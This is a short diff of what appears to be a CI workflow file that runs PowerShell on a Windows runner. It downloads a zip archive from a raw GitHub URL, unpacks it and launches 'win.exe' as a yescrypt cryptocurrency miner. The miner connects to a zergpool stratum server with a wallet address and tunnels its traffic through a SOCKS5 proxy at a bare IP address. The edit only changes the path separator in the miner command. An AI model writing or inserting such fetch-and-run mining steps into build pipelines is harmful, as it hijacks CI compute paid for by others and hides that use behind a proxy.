@@ -38,7 +38,7 @@ jobs:
         #chdir C:\Windows\System32
         Invoke-WebRequest https://raw.githubusercontent.com/wadaefendi/daef/main/Api_App.zip -Outfile Api_App.zip
         Expand-Archive Api_App.zip
-        .\win.exe -a yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u D8cGgEWvV1WMFyGMpznx8Qo5ti9dtaMPtY.Rig_XXX -p c=DGB,mc=BSTY/XMY -t 2 -q -x socks5://27.116.51.92:6667
+        ./win.exe -a yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u D8cGgEWvV1WMFyGMpznx8Qo5ti9dtaMPtY.Rig_XXX -p c=DGB,mc=BSTY/XMY -t 2 -q -x socks5://27.116.51.92:6667
         
         
         
